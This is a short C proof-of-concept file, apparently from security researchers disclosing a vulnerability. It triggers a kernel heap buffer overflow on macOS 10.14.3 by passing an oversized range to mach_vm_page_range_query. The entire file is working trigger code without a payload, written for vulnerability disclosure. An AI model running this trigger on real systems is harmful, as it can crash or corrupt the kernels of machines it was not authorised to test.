/*
 * Author: Junho Jang and Hanul Choi of LINE GrayLab
 * Description:
 ** this code is proof of concept for kernel heap buffer overflow security vulnerabiltiy
 * How to compile:
 ** gcc -o poc poc.c
 * Test:
 ** OSX 10.14.3 kernel KASAN
 */

#include <stdio.h>
#include <stdlib.h>
#include <mach/mach_port.h>
#include <mach/mach_host.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>
#include <os/overflow.h>

int main(int argc, char**argv) {
  kern_return_t kr;

  task_t task = mach_task_self();

  mach_vm_offset_t address = 0x10;
  mach_vm_size_t size = 0xffffffffffffffff;

  int result[10] = {0,};
  mach_vm_address_t dispositions_addr = (mach_vm_address_t) &result;
  mach_vm_size_t dispositions_count = 10;

  kr = mach_vm_page_range_query(task, address, size, dispositions_addr, &dispositions_count);
}
